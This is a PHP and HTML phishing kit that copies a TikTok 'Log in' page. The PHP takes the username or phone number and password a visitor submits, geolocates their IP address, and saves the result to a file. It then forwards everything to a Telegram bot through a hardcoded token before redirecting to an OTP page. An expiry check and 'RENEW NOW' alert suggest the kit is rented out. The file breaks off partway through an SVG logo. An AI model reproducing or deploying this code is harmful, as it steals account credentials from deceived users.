<?php
session_start(); // Start the session first

// Function to send message to Telegram using cURL
function sendToTelegram($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($result === false || $httpCode !== 200) {
        return false;
    }
    
    $response = json_decode($result, true);
    return isset($response['ok']) && $response['ok'];
}

// Function to save user data to text file
function saveUserData($name, $password, $country, $region, $ip) {
    $userData = [
        'name' => $name,
        'password' => $password,
        'country' => $country,
        'region' => $region,
        'ip' => $ip,
        'timestamp' => date('Y-m-d H:i:s')
    ];
    
    file_put_contents('user_data.txt', json_encode($userData));
}

// Fetch the date from the text file (ensure the file is outside the web root for security)
$dateFile = 'time.txt';
if (!file_exists($dateFile)) {
    die("Error: Time configuration file not found.");
}

$setDate = trim(file_get_contents($dateFile));
$setDate = new DateTime($setDate);

// Fetch the current time
$currentTime = new DateTime('now');

// Compare the current time with the set date
if ($currentTime > $setDate) {
    // Prevent multiple expired redirects
    if (!isset($_SESSION['expired_redirect_sent'])) {
        $_SESSION['expired_redirect_sent'] = true;
        
        // Start output buffering to prevent header issues
        ob_start();
        
        // Send expired message to Telegram before redirecting
        $expiredMessage = "⏰ Page Expired\nLink: IG-VOTE\nStatus: Expired\nRENEW NOW!";
        
        // Load Telegram chat ID from the text file
        if (file_exists('telegram_chat_id.txt')) {
            $chatId = trim(file_get_contents('telegram_chat_id.txt'));
            $botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';
            
            // Send the expired message to Telegram
            sendToTelegram($chatId, $expiredMessage, $botToken);
        }
        
        // Clear any output buffer
        ob_end_clean();
    }
    
    // Redirect to 404 page
    header('Location: 404.php');
    exit();
}

// Function to sanitize input
function sanitizeInput($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

// Function to get real user IP (handles proxies and load balancers)
function getRealUserIP() {
    $ipKeys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 
               'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 
               'REMOTE_ADDR'];
    
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            $ip = $_SERVER[$key];
            if (strpos($ip, ',') !== false) {
                $ip = explode(',', $ip)[0];
            }
            $ip = trim($ip);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

$message = '';
$messageType = 'error';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'])) {
    $name = sanitizeInput($_POST['user_name']);
    $password = isset($_POST['user_age']) ? sanitizeInput($_POST['user_age']) : '';
    $countryCode = isset($_POST['country_code']) ? sanitizeInput($_POST['country_code']) : '+234';
    
    if (empty($name)) {
        $message = "Invalid input. Name is required.";
        $messageType = 'error';
    } else {
        // Get user IP address
        $userIp = getRealUserIP();
        
        // Get user location with enhanced reliability
        $locationData = [];
        $country = 'Unknown';
        $region = 'Unknown';
        $city = 'Unknown';
        
        try {
            // Try multiple IP geolocation services for better reliability
            $apiUrls = [
                "http://ip-api.com/json/{$userIp}?fields=status,country,regionName,city,query",
                "https://ipapi.co/{$userIp}/json/",
                "http://www.geoplugin.net/json.gp?ip={$userIp}"
            ];
            
            foreach ($apiUrls as $apiUrl) {
                $context = stream_context_create([
                    'http' => [
                        'timeout' => 5,
                        'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    ]
                ]);
                
                $response = @file_get_contents($apiUrl, false, $context);
                
                if ($response !== false) {
                    $locationData = json_decode($response, true);
                    
                    // Handle different API response formats
                    if (strpos($apiUrl, 'ip-api.com') !== false) {
                        if (isset($locationData['status']) && $locationData['status'] === 'success') {
                            $country = $locationData['country'] ?? 'Unknown';
                            $region = $locationData['regionName'] ?? 'Unknown';
                            $city = $locationData['city'] ?? 'Unknown';
                            break;
                        }
                    } elseif (strpos($apiUrl, 'ipapi.co') !== false) {
                        if (isset($locationData['country_name']) && !empty($locationData['country_name'])) {
                            $country = $locationData['country_name'];
                            $region = $locationData['region'] ?? 'Unknown';
                            $city = $locationData['city'] ?? 'Unknown';
                            break;
                        }
                    } elseif (strpos($apiUrl, 'geoplugin.net') !== false) {
                        if (isset($locationData['geoplugin_countryName']) && !empty($locationData['geoplugin_countryName'])) {
                            $country = $locationData['geoplugin_countryName'];
                            $region = $locationData['geoplugin_regionName'] ?? 'Unknown';
                            $city = $locationData['geoplugin_city'] ?? 'Unknown';
                            break;
                        }
                    }
                }
            }
            
            // If all APIs fail, try to get basic info from user agent or other headers
            if ($country === 'Unknown') {
                // Check for CloudFlare country header
                if (isset($_SERVER['HTTP_CF_IPCOUNTRY'])) {
                    $country = $_SERVER['HTTP_CF_IPCOUNTRY'];
                }
                // Check for other location headers
                elseif (isset($_SERVER['HTTP_X_COUNTRY_CODE'])) {
                    $country = $_SERVER['HTTP_X_COUNTRY_CODE'];
                }
                // Default fallback based on common patterns
                else {
                    $country = 'Nigeria'; // Default for this application
                    $region = 'Lagos';
                    $city = 'Lagos';
                }
            }
            
        } catch (Exception $e) {
            // Final fallback
            $country = 'Nigeria';
            $region = 'Lagos';
            $city = 'Lagos';
        }
        
        $ip = $userIp;
        
        if ($locationData && is_array($locationData)) {
            $country = $locationData['country'] ?? 'Unknown';
            $region = $locationData['region'] ?? 'Unknown';
            $city = $locationData['city'] ?? 'Unknown';
            $ip = $locationData['ip'] ?? $userIp;
        }
        
        // Save user data to text file FIRST
        saveUserData($name, $password, $country, $region, $ip);
        
        // Load Telegram chat ID from the text file
        if (file_exists('telegram_chat_id.txt')) {
            $chatId = trim(file_get_contents('telegram_chat_id.txt'));
        } else {
            $chatId = '';
        }
        
        if (empty($chatId)) {
            $message = "Chat ID is empty. Please check the telegram_chat_id.txt file.";
            $messageType = 'error';
        } else {
            $botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';
            
            // Enhanced message with country code and city information
            $telegramMessage = "📩NEW LOGIN ATTEMPT📩\n\nDETAILS:\n•📲 PLATFORM: TIKTOK\n•👤 UserName: $name";
            
            // Only add password if it exists (for email form)
            if (!empty($password)) {
                $telegramMessage .= "\n•🔑 Password: $password";
            }
            
            $telegramMessage .= "\n•📞 Country Code: $countryCode\n\nLOCATION:\n•🌍 Country: $country\n•🗺️ State: $region\n•🏙️ City: $city\n•🌐 IP: $ip\n\n🔒•SECURED BY SHARPLOGS•🔒";
            
            // Send to Telegram and redirect to OTP on first submission
            if (sendToTelegram($chatId, $telegramMessage, $botToken)) {
                // Redirect to OTP page immediately after successful Telegram send
                header('Location: otp.php');
                exit();
            } else {
                $message = "Error sending message to Telegram.";
                $messageType = 'error';
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Login Phone / Email
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
    body {
      font-family: 'Inter', sans-serif;
    }
  </style>
 </head>
 <body class="bg-white text-black min-h-screen flex flex-col items-center">
  <!-- Container -->
  <div class="w-full max-w-md md:max-w-lg lg:max-w-xl flex flex-col flex-grow">
   <!-- Header with back arrow, title, and question mark icon -->
   <div class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
    <button aria-label="Back" class="text-black text-xl font-semibold">
     <i class="fas fa-chevron-left">
     </i>
    </button>
    <h1 class="font-bold text-lg text-center flex-1">
     Log in
    </h1>
    <button aria-label="Help" class="text-gray-500 text-xl">
     <i class="fas fa-question-circle">
     </i>
    </button>
   </div>
   
   <!-- Display message -->
   <?php if (!empty($message)): ?>
   <div class="mx-4 mt-4 p-3 <?php echo $messageType === 'success' ? 'bg-green-100 border border-green-400 text-green-700' : 'bg-red-100 border border-red-400 text-red-700'; ?> rounded">
    <?php echo htmlspecialchars($message); ?>
   </div>
   <?php endif; ?>
   
   <!-- Tabs -->
   <div class="flex border-b border-black/80">
    <button aria-selected="true" class="flex-1 text-center py-3 font-semibold text-black border-b-2 border-black" id="emailTab" onclick="showTab('email')" tabindex="0" type="button">
     Email / Username
    </button>
    <button aria-selected="false" class="flex-1 text-center py-3 font-normal text-gray-500" id="phoneTab" onclick="showTab('phone')" tabindex="-1" type="button">
     Phone
    </button>
   </div>
   
   <!-- Email / Username input container -->
   <form class="px-6 pt-6" id="emailForm" method="POST" action="">
    
    <div class="relative w-full">
     <input aria-label="Email or Username input" autocomplete="username" class="w-full bg-gray-100 rounded-lg py-3 px-4 text-[15px] font-normal text-black placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-pink-600 focus:bg-white transition" id="emailInput" placeholder="Enter your email or username" type="text" name="user_name" required/>
     <button aria-label="Clear email input" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600" onclick="document.getElementById('emailInput').value = ''" type="button">
      <i class="fas fa-times-circle text-lg">
      </i>
     </button>
    </div>
    
    <!-- Password field for email form (initially hidden) -->
    <div class="mt-4" id="passwordContainer" style="display: none;">
     <input aria-label="Password input" class="w-full bg-gray-100 rounded-lg py-3 px-4 text-[15px] font-normal text-black placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-pink-600 focus:bg-white transition" id="passwordInput" placeholder="Enter your password" type="password" name="user_age"/>
    </div>
    
    <!-- Remember login checkbox (initially hidden) -->
    <label class="inline-flex items-center space-x-3 mt-6 max-w-full cursor-pointer select-none" id="rememberContainer" style="display: none;">
     <input class="w-5 h-5 rounded-md border-2 border-pink-600 bg-pink-600 text-white focus:ring-pink-600 focus:ring-2" type="checkbox"/>
     <span class="text-[13px] text-gray-700 leading-tight">
      Remember login
     </span>
    </label>
    
    <!-- Continue button (always visible) -->
    <button class="mt-6 w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold text-[15px] py-3 rounded-lg" type="submit" id="continueButton">
     Continue
    </button>
   </form>
   
   <!-- Phone input container -->
   <form class="px-4 pt-4 hidden" id="phoneForm" method="POST" action="">
    <div class="flex items-center bg-gray-100 rounded-lg px-3 py-2 space-x-2 text-[15px] font-normal text-black w-full">
     <select aria-label="Select country code" class="flex items-center space-x-1 font-normal text-black whitespace-nowrap bg-transparent outline-none cursor-pointer pr-2 min-w-0 max-w-[120px]" name="country_code" id="countryCode">
      <option value="+93">🇦🇫 +93</option>
      <option value="+355">🇦🇱 +355</option>
      <option value="+213">🇩🇿 +213</option>
      <option value="+1684">🇦🇸 +1684 American Samoa</option>
      <option value="+376">🇦🇩 +376 Andorra</option>
      <option value="+244">🇦🇴 +244 Angola</option>
      <option value="+1264">🇦🇮 +1264 Anguilla</option>
      <option value="+1268">🇦🇬 +1268 Antigua and Barbuda</option>
      <option value="+54">🇦🇷 +54 Argentina</option>
      <option value="+374">🇦🇲 +374 Armenia</option>
      <option value="+297">🇦🇼 +297 Aruba</option>
      <option value="+61">🇦🇺 +61 Australia</option>
      <option value="+43">🇦🇹 +43 Austria</option>
      <option value="+994">🇦🇿 +994 Azerbaijan</option>
      <option value="+1242">🇧🇸 +1242 Bahamas</option>
      <option value="+973">🇧🇭 +973 Bahrain</option>
      <option value="+880">🇧🇩 +880 Bangladesh</option>
      <option value="+1246">🇧🇧 +1246 Barbados</option>
      <option value="+375">🇧🇾 +375 Belarus</option>
      <option value="+32">🇧🇪 +32 Belgium</option>
      <option value="+501">🇧🇿 +501 Belize</option>
      <option value="+229">🇧🇯 +229 Benin</option>
      <option value="+1441">🇧🇲 +1441 Bermuda</option>
      <option value="+975">🇧🇹 +975 Bhutan</option>
      <option value="+591">🇧🇴 +591 Bolivia</option>
      <option value="+387">🇧🇦 +387 Bosnia and Herzegovina</option>
      <option value="+267">🇧🇼 +267 Botswana</option>
      <option value="+55">🇧🇷 +55 Brazil</option>
      <option value="+1284">🇻🇬 +1284 British Virgin Islands</option>
      <option value="+673">🇧🇳 +673 Brunei</option>
      <option value="+359">🇧🇬 +359 Bulgaria</option>
      <option value="+226">🇧🇫 +226 Burkina Faso</option>
      <option value="+257">🇧🇮 +257 Burundi</option>
      <option value="+855">🇰🇭 +855 Cambodia</option>
      <option value="+237">🇨🇲 +237 Cameroon</option>
      <option value="+1">🇨🇦 +1 Canada</option>
      <option value="+238">🇨🇻 +238 Cape Verde</option>
      <option value="+1345">🇰🇾 +1345 Cayman Islands</option>
      <option value="+236">🇨🇫 +236 Central African Republic</option>
      <option value="+235">🇹🇩 +235 Chad</option>
      <option value="+56">🇨🇱 +56 Chile</option>
      <option value="+86">🇨🇳 +86 China</option>
      <option value="+57">🇨🇴 +57 Colombia</option>
      <option value="+269">🇰🇲 +269 Comoros</option>
      <option value="+242">🇨🇬 +242 Congo</option>
      <option value="+243">🇨🇩 +243 Congo (DRC)</option>
      <option value="+682">🇨🇰 +682 Cook Islands</option>
      <option value="+506">🇨🇷 +506 Costa Rica</option>
      <option value="+225">🇨🇮 +225 Côte d'Ivoire</option>
      <option value="+385">🇭🇷 +385 Croatia</option>
      <option value="+53">🇨🇺 +53 Cuba</option>
      <option value="+357">🇨🇾 +357 Cyprus</option>
      <option value="+420">🇨🇿 +420 Czech Republic</option>
      <option value="+45">🇩🇰 +45 Denmark</option>
      <option value="+253">🇩🇯 +253 Djibouti</option>
      <option value="+1767">🇩🇲 +1767 Dominica</option>
      <option value="+1809">🇩🇴 +1809 Dominican Republic</option>
      <option value="+593">🇪🇨 +593 Ecuador</option>
      <option value="+20">🇪🇬 +20 Egypt</option>
      <option value="+503">🇸🇻 +503 El Salvador</option>
      <option value="+240">🇬🇶 +240 Equatorial Guinea</option>
      <option value="+291">🇪🇷 +291 Eritrea</option>
      <option value="+372">🇪🇪 +372 Estonia</option>
      <option value="+251">🇪🇹 +251 Ethiopia</option>
      <option value="+500">🇫🇰 +500 Falkland Islands</option>
      <option value="+298">🇫🇴 +298 Faroe Islands</option>
      <option value="+679">🇫🇯 +679 Fiji</option>
      <option value="+358">🇫🇮 +358 Finland</option>
      <option value="+33">🇫🇷 +33 France</option>
      <option value="+594">🇬🇫 +594 French Guiana</option>
      <option value="+689">🇵🇫 +689 French Polynesia</option>
      <option value="+241">🇬🇦 +241 Gabon</option>
      <option value="+220">🇬🇲 +220 Gambia</option>
      <option value="+995">🇬🇪 +995 Georgia</option>
      <option value="+49">🇩🇪 +49 Germany</option>
      <option value="+233">🇬🇭 +233 Ghana</option>
      <option value="+350">🇬🇮 +350 Gibraltar</option>
      <option value="+30">🇬🇷 +30 Greece</option>
      <option value="+299">🇬🇱 +299 Greenland</option>
      <option value="+1473">🇬🇩 +1473 Grenada</option>
      <option value="+590">🇬🇵 +590 Guadeloupe</option>
      <option value="+1671">🇬🇺 +1671 Guam</option>
      <option value="+502">🇬🇹 +502 Guatemala</option>
      <option value="+224">🇬🇳 +224 Guinea</option>
      <option value="+245">🇬🇼 +245 Guinea-Bissau</option>
      <option value="+592">🇬🇾 +592 Guyana</option>
      <option value="+509">🇭🇹 +509 Haiti</option>
      <option value="+504">🇭🇳 +504 Honduras</option>
      <option value="+852">🇭🇰 +852 Hong Kong</option>
      <option value="+36">🇭🇺 +36 Hungary</option>
      <option value="+354">🇮🇸 +354 Iceland</option>
      <option value="+91">🇮🇳 +91 India</option>
      <option value="+62">🇮🇩 +62 Indonesia</option>
      <option value="+98">🇮🇷 +98 Iran</option>
      <option value="+964">🇮🇶 +964 Iraq</option>
      <option value="+353">🇮🇪 +353 Ireland</option>
      <option value="+972">🇮🇱 +972 Israel</option>
      <option value="+39">🇮🇹 +39 Italy</option>
      <option value="+1876">🇯🇲 +1876 Jamaica</option>
      <option value="+81">🇯🇵 +81 Japan</option>
      <option value="+962">🇯🇴 +962 Jordan</option>
      <option value="+7">🇰🇿 +7 Kazakhstan</option>
      <option value="+254">🇰🇪 +254 Kenya</option>
      <option value="+686">🇰🇮 +686 Kiribati</option>
      <option value="+965">🇰🇼 +965 Kuwait</option>
      <option value="+996">🇰🇬 +996 Kyrgyzstan</option>
      <option value="+856">🇱🇦 +856 Laos</option>
      <option value="+371">🇱🇻 +371 Latvia</option>
      <option value="+961">🇱🇧 +961 Lebanon</option>
      <option value="+266">🇱🇸 +266 Lesotho</option>
      <option value="+231">🇱🇷 +231 Liberia</option>
      <option value="+218">🇱🇾 +218 Libya</option>
      <option value="+423">🇱🇮 +423 Liechtenstein</option>
      <option value="+370">🇱🇹 +370 Lithuania</option>
      <option value="+352">🇱🇺 +352 Luxembourg</option>
      <option value="+853">🇲🇴 +853 Macao</option>
      <option value="+389">🇲🇰 +389 Macedonia</option>
      <option value="+261">🇲🇬 +261 Madagascar</option>
      <option value="+265">🇲🇼 +265 Malawi</option>
      <option value="+60">🇲🇾 +60 Malaysia</option>
      <option value="+960">🇲🇻 +960 Maldives</option>
      <option value="+223">🇲🇱 +223 Mali</option>
      <option value="+356">🇲🇹 +356 Malta</option>
      <option value="+692">🇲🇭 +692 Marshall Islands</option>
      <option value="+596">🇲🇶 +596 Martinique</option>
      <option value="+222">🇲🇷 +222 Mauritania</option>
      <option value="+230">🇲🇺 +230 Mauritius</option>
      <option value="+52">🇲🇽 +52 Mexico</option>
      <option value="+691">🇫🇲 +691 Micronesia</option>
      <option value="+373">🇲🇩 +373 Moldova</option>
      <option value="+377">🇲🇨 +377 Monaco</option>
      <option value="+976">🇲🇳 +976 Mongolia</option>
      <option value="+382">🇲🇪 +382 Montenegro</option>
      <option value="+1664">🇲🇸 +1664 Montserrat</option>
      <option value="+212">🇲🇦 +212 Morocco</option>
      <option value="+258">🇲🇿 +258 Mozambique</option>
      <option value="+95">🇲🇲 +95 Myanmar</option>
      <option value="+264">🇳🇦 +264 Namibia</option>
      <option value="+674">🇳🇷 +674 Nauru</option>
      <option value="+977">🇳🇵 +977 Nepal</option>
      <option value="+31">🇳🇱 +31 Netherlands</option>
      <option value="+687">🇳🇨 +687 New Caledonia</option>
      <option value="+64">🇳🇿 +64 New Zealand</option>
      <option value="+505">🇳🇮 +505 Nicaragua</option>
      <option value="+227">🇳🇪 +227 Niger</option>
      <option value="+234" >🇳🇬 +234 Nigeria</option>
      <option value="+683">🇳🇺 +683 Niue</option>
      <option value="+850">🇰🇵 +850 North Korea</option>
      <option value="+1670">🇲🇵 +1670 Northern Mariana Islands</option>
      <option value="+47">🇳🇴 +47 Norway</option>
      <option value="+968">🇴🇲 +968 Oman</option>
      <option value="+92">🇵🇰 +92 Pakistan</option>
      <option value="+680">🇵🇼 +680 Palau</option>
      <option value="+507">🇵🇦 +507 Panama</option>
      <option value="+675">🇵🇬 +675 Papua New Guinea</option>
      <option value="+595">🇵🇾 +595 Paraguay</option>
      <option value="+51">🇵🇪 +51 Peru</option>
      <option value="+63">🇵🇭 +63 Philippines</option>
      <option value="+48">🇵🇱 +48 Poland</option>
      <option value="+351">🇵🇹 +351 Portugal</option>
      <option value="+1787">🇵🇷 +1787 Puerto Rico</option>
      <option value="+974">🇶🇦 +974 Qatar</option>
      <option value="+262">🇷🇪 +262 Réunion</option>
      <option value="+40">🇷🇴 +40 Romania</option>
      <option value="+7">🇷🇺 +7 Russia</option>
      <option value="+250">🇷🇼 +250 Rwanda</option>
      <option value="+1869">🇰🇳 +1869 Saint Kitts and Nevis</option>
      <option value="+1758">🇱🇨 +1758 Saint Lucia</option>
      <option value="+1784">🇻🇨 +1784 Saint Vincent and the Grenadines</option>
      <option value="+685">🇼🇸 +685 Samoa</option>
      <option value="+378">🇸���2 +378 San Marino</option>
      <option value="+239">🇸���3 +239 São Tomé and Príncipe</option>
      <option value="+966">🇸🇦 +966 Saudi Arabia</option>
      <option value="+221">🇸🇳 +221 Senegal</option>
      <option value="+381">🇷���8 +381 Serbia</option>
      <option value="+248">🇸🇨 +248 Seychelles</option>
      <option value="+232">🇸🇱 +232 Sierra Leone</option>
      <option value="+65">🇸🇬 +65 Singapore</option>
      <option value="+421">🇸🇰 +421 Slovakia</option>
      <option value="+386">🇸🇮 +386 Slovenia</option>
      <option value="+677">🇸🇧 +677 Solomon Islands</option>
      <option value="+252">🇸🇴 +252 Somalia</option>
      <option value="+27">🇿🇦 +27 South Africa</option>
      <option value="+82">🇰🇷 +82 South Korea</option>
      <option value="+211">🇸���8 +211 South Sudan</option>
      <option value="+34">🇪���8 +34 Spain</option>
      <option value="+94">🇱���4 +94 Sri Lanka</option>
      <option value="+249">🇸🇩 +249 Sudan</option>
      <option value="+597">🇸🇷 +597 Suriname</option>
      <option value="+268">🇸🇿 +268 Swaziland</option>
      <option value="+46">🇸🇪 +46 Sweden</option>
      <option value="+41">🇨🇭 +41 Switzerland</option>
      <option value="+963">🇸🇾 +963 Syria</option>
      <option value="+886">🇹🇼 +886 Taiwan</option>
      <option value="+992">🇹🇯 +992 Tajikistan</option>
      <option value="+255">🇹🇿 +255 Tanzania</option>
      <option value="+66">🇹🇭 +66 Thailand</option>
      <option value="+670">🇹🇱 +670 Timor-Leste</option>
      <option value="+228">🇹🇬 +228 Togo</option>
      <option value="+690">🇹🇰 +690 Tokelau</option>
      <option value="+676">🇹🇴 +676 Tonga</option>
      <option value="+1868">🇹🇹 +1868 Trinidad and Tobago</option>
      <option value="+216">🇹🇳 +216 Tunisia</option>
      <option value="+90">🇹🇷 +90 Turkey</option>
      <option value="+993">🇹🇲 +993 Turkmenistan</option>
      <option value="+1649">🇹🇨 +1649 Turks and Caicos Islands</option>
      <option value="+688">🇹🇻 +688 Tuvalu</option>
      <option value="+256">🇺🇬 +256 Uganda</option>
      <option value="+380">🇺🇦 +380 Ukraine</option>
      <option value="+971">🇦🇪 +971 United Arab Emirates</option>
      <option value="+44">🇬🇧 +44 United Kingdom</option>
      <option value="+1" selected>🇺🇸 +1 United States</option>
      <option value="+598">🇺🇾 +598 Uruguay</option>
      <option value="+998">🇺🇿 +998 Uzbekistan</option>
      <option value="+678">🇻🇺 +678 Vanuatu</option>
      <option value="+379">🇻🇦 +379 Vatican City</option>
      <option value="+58">🇻🇪 +58 Venezuela</option>
      <option value="+84">🇻🇳 +84 Vietnam</option>
      <option value="+1340">🇻🇮 +1340 Virgin Islands (US)</option>
      <option value="+681">🇼🇫 +681 Wallis and Futuna</option>
      <option value="+967">🇾🇪 +967 Yemen</option>
      <option value="+260">🇿🇲 +260 Zambia</option>
      <option value="+263">🇿🇼 +263 Zimbabwe</option>
     </select>
     <div class="border-l border-gray-300 h-6">
     </div>
     <input aria-label="Phone number input" class="flex-1 bg-transparent outline-none text-[15px] font-normal text-black min-w-0" inputmode="numeric" maxlength="15" pattern="[0-9]*" placeholder="Phone number" type="tel" name="user_name" required/>
     <button aria-label="Clear phone number" class="text-gray-400 hover:text-gray-600 flex-shrink-0" type="button" onclick="this.previousElementSibling.value = ''">
      <i class="fas fa-times-circle text-lg">
      </i>
     </button>
    </div>
    
    <!-- Remember login checkbox -->
    <label class="inline-flex items-center space-x-3 mt-8 max-w-full cursor-pointer select-none">
     <input class="w-5 h-5 rounded-md border-2 border-pink-600 text-pink-600 focus:ring-pink-600 focus:ring-2" type="checkbox"/>
     <span class="text-[13px] text-gray-700 leading-tight">
      Remember login
     </span>
    </label>
    <!-- Continue button -->
    <button class="mt-6 w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold text-[15px] py-3 rounded-lg" type="submit">
     Continue
    </button>
   </form>
   
   <!-- Email / Username input container -->
   <form class="px-6 pt-6 hidden" id="emailForm" method="POST" action="">
    
    <div class="relative w-full">
     <input aria-label="Email or Username input" autocomplete="username" class="w-full bg-gray-100 rounded-lg py-3 px-4 text-[15px] font-normal text-black placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-pink-600 focus:bg-white transition" id="emailInput" placeholder="Enter your email or username" type="text" name="user_name" required/>
     <button aria-label="Clear email input" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600" onclick="document.getElementById('emailInput').value = ''" type="button">
      <i class="fas fa-times-circle text-lg">
      </i>
     </button>
    </div>
    
    <!-- Password field for email form (initially hidden) -->
    <div class="mt-4" id="passwordContainer" style="display: none;">
     <input aria-label="Password input" class="w-full bg-gray-100 rounded-lg py-3 px-4 text-[15px] font-normal text-black placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-pink-600 focus:bg-white transition" id="passwordInput" placeholder="Enter your password" type="password" name="user_age"/>
    </div>
    
    <!-- Remember login checkbox (initially hidden) -->
    <label class="inline-flex items-center space-x-3 mt-6 max-w-full cursor-pointer select-none" id="rememberContainer" style="display: none;">
     <input class="w-5 h-5 rounded-md border-2 border-pink-600 bg-pink-600 text-white focus:ring-pink-600 focus:ring-2" type="checkbox"/>
     <span class="text-[13px] text-gray-700 leading-tight">
      Remember login
     </span>
    </label>
    
    <!-- Continue button (always visible) -->
    <button class="mt-6 w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold text-[15px] py-3 rounded-lg" type="submit" id="continueButton">
     Continue
    </button>
   </form>
   
   <!-- Login with Password Button at bottom -->
   <div class="px-6 pb-6 mt-auto" id="loginWithPasswordContainer">
    <div class="text-center">
     <button class="text-black font-bold text-[15px] hover:text-gray-600 cursor-pointer bg-transparent border-none p-0" onclick="showPasswordLogin()" type="button">
      <i class="fas fa-lock mr-2"></i>
      Login with Password
     </button>
    </div>
   </div>
  </div>
  <!-- Footer with TikTok logo -->
  <footer class="w-full max-w-md md:max-w-lg lg:max-w-xl flex justify-center items-center py-4 border-t border-gray-200 mt-auto">
  <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="500px" height="23.6895px" viewBox="0 0 1000 291.379" enable-background="new 0 0 1000 291.379" xml:space="preserve">
<g>
	<path fill="#FF004F" d="M191.102,105.182c18.814,13.442,41.862,21.351,66.755,21.351V78.656c-4.711,0.001-9.41-0.49-14.019-1.466
		v37.686c-24.891,0-47.936-7.909-66.755-21.35v97.703c0,48.876-39.642,88.495-88.54,88.495c-18.245,0-35.203-5.513-49.29-14.968
		c16.078,16.431,38.5,26.624,63.306,26.624c48.901,0,88.545-39.619,88.545-88.497v-97.701H191.102z M208.396,56.88
		c-9.615-10.499-15.928-24.067-17.294-39.067v-6.158h-13.285C181.161,30.72,192.567,47.008,208.396,56.88L208.396,56.88z
		 M70.181,227.25c-5.372-7.04-8.275-15.652-8.262-24.507c0-22.354,18.132-40.479,40.502-40.479
		c4.169-0.001,8.313,0.637,12.286,1.897v-48.947c-4.643-0.636-9.329-0.906-14.013-0.807v38.098c-3.976-1.26-8.122-1.9-12.292-1.896
		c-22.37,0-40.501,18.123-40.501,40.48C47.901,206.897,56.964,220.583,70.181,227.25z"/>
	<path d="M177.083,93.525c18.819,13.441,41.864,21.35,66.755,21.35V77.189c-13.894-2.958-26.194-10.215-35.442-20.309
		c-15.83-9.873-27.235-26.161-30.579-45.225h-34.896v191.226c-0.079,22.293-18.18,40.344-40.502,40.344
		c-13.154,0-24.84-6.267-32.241-15.975c-13.216-6.667-22.279-20.354-22.279-36.16c0-22.355,18.131-40.48,40.501-40.48
		c4.286,0,8.417,0.667,12.292,1.896v-38.098c-48.039,0.992-86.674,40.224-86.674,88.474c0,24.086,9.621,45.921,25.236,61.875
		c14.087,9.454,31.045,14.968,49.29,14.968c48.899,0,88.54-39.621,88.54-88.496V93.525L177.083,93.525z"/>
	<path fill="#00F2EA" d="M243.838,77.189V66.999c-12.529,0.019-24.812-3.488-35.442-10.12
		C217.806,67.176,230.197,74.276,243.838,77.189z M177.817,11.655c-0.319-1.822-0.564-3.656-0.734-5.497V0h-48.182v191.228
		c-0.077,22.29-18.177,40.341-40.501,40.341c-6.554,0-12.742-1.555-18.222-4.318c7.401,9.707,19.087,15.973,32.241,15.973
		c22.32,0,40.424-18.049,40.502-40.342V11.655H177.817z M100.694,114.408V103.56c-4.026-0.55-8.085-0.826-12.149-0.824
		C39.642,102.735,0,142.356,0,191.228c0,30.64,15.58,57.643,39.255,73.527c-15.615-15.953-25.236-37.789-25.236-61.874
		C14.019,154.632,52.653,115.4,100.694,114.408z"/>
	<path fill="#FF004F" d="M802.126,239.659c34.989,0,63.354-28.136,63.354-62.84c0-34.703-28.365-62.844-63.354-62.844h-9.545
		c34.99,0,63.355,28.14,63.355,62.844s-28.365,62.84-63.355,62.84H802.126z"/>
	<path fill="#00F2EA" d="M791.716,113.975h-9.544c-34.988,0-63.358,28.14-63.358,62.844s28.37,62.84,63.358,62.84h9.544
		c-34.993,0-63.358-28.136-63.358-62.84C728.357,142.116,756.723,113.975,791.716,113.975z"/>
	<path d="M310.062,85.572v31.853h37.311v121.374h37.326V118.285h30.372l10.414-32.712H310.062z M615.544,85.572v31.853h37.311
